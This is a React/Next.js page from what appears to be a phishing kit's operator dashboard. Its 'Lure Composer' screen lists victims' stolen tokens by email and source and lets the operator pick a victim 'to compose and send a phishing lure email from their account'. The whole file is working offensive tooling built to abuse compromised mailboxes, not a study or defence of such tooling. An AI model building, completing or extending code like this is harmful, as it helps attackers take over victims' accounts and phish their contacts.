"use client";

import { useState, useEffect, useCallback } from "react";
import { motion } from "framer-motion";
import { useRouter } from "next/navigation";
import { Token } from "@/types/token";
import { fetchTokens } from "@/lib/api";
import { Fish, Search, Loader2, AlertCircle, ChevronRight, Mail } from "lucide-react";
import { Input } from "@/components/ui/input";
import { DashboardTopBar } from "@/components/dashboard/top-bar";
import { cn } from "@/lib/utils";

function TokenAvatar({ email, size = 32 }: { email: string; size?: number }) {
  const initial = (email?.[0] || "?").toUpperCase();
  const hue = email.split("").reduce((acc, c) => acc + c.charCodeAt(0), 0) % 360;
  return (
    <div
      className="rounded-full flex items-center justify-center flex-shrink-0 font-semibold text-[10px]"
      style={{
        width: size,
        height: size,
        backgroundColor: `hsl(${hue} 60% 20%)`,
        color: `hsl(${hue} 70% 70%)`,
        border: `1px solid hsl(${hue} 50% 30%)`,
      }}
    >
      {initial}
    </div>
  );
}

export default function LureSelectorPage() {
  const router = useRouter();
  const [tokens, setTokens] = useState<Token[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [search, setSearch] = useState("");

  const loadTokens = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const data = await fetchTokens();
      setTokens(data || []);
    } catch (err: any) {
      setError(err.message || "Failed to load tokens");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadTokens();
  }, [loadTokens]);

  const filtered = tokens.filter((t) => {
    if (!search.trim()) return true;
    const q = search.toLowerCase();
    return (
      t.email?.toLowerCase().includes(q) ||
      t.source?.toLowerCase().includes(q)
    );
  });

  return (
    <div className="flex-1 flex flex-col min-h-0">
      <DashboardTopBar
        title="Lure Composer"
        subtitle="Select a victim to compose and send a phishing lure email from their account"
      />

      <div className="flex-1 overflow-y-auto">
        <div className="mx-auto w-full max-w-[1200px] px-4 sm:px-6 lg:px-8 py-6">
          {/* Search */}
          <div className="flex items-center gap-3 mb-6">
            <div className="relative flex-1 max-w-md">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search tokens..."
                className="pl-9 h-10 bg-secondary/30 border-white/5"
              />
            </div>
          </div>

          {loading ? (
            <div className="flex items-center justify-center py-24 gap-2">
              <Loader2 className="h-5 w-5 animate-spin text-muted-foreground" />
              <p className="text-sm text-muted-foreground">Loading tokens...</p>
            </div>
          ) : error ? (
            <div className="flex items-center justify-center py-24 gap-2">
              <AlertCircle className="h-5 w-5 text-rose-400" />
              <p className="text-sm text-muted-foreground">{error}</p>
            </div>
          ) : filtered.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-24 gap-3">
              <Fish className="h-10 w-10 text-muted-foreground/30" />
              <p className="text-sm text-muted-foreground">No tokens found</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
              {filtered.map((token, i) => (
                <motion.button
                  key={token.id}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: i * 0.03 }}
                  onClick={() => router.push(`/lure/${token.id}`)}
                  className={cn(
                    "flex items-center gap-3 p-4 rounded-xl border border-white/5 bg-secondary/10",
                    "hover:bg-secondary/20 hover:border-primary/20 transition-all text-left"
                  )}
                >
                  <TokenAvatar email={token.email || "?"} size={36} />
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium text-foreground truncate">{token.email}</p>
                    <p className="text-[11px] text-muted-foreground capitalize">{token.source}</p>
                  </div>
                  <ChevronRight className="h-4 w-4 text-muted-foreground flex-shrink-0" />
                </motion.button>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
